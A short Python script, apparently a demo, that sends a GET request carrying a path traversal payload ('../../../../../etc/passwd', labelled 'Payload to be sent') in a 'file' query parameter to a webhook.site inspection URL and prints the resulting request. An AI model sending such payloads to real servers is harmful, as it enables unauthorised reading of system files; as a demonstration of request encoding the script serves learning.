import requests 
from pprint import pprint as pp 

def makeGetReqWithQueryString(url,queryParam):
    query = {
        "file": queryParam
    }

    res = requests.get(url, params=query)  
    print(f'[+] The requested URL: {res.request.url}') 
    pp(f'[+] Headers in the request: {res.request.headers}', width=45)

target = 'https://webhook.site/0f0e507e-0d67-4e78-9a25-bd8c54bdd27d' 
param = '../../../../../etc/passwd'     # Payload to be sent. 
makeGetReqWithQueryString(target, param)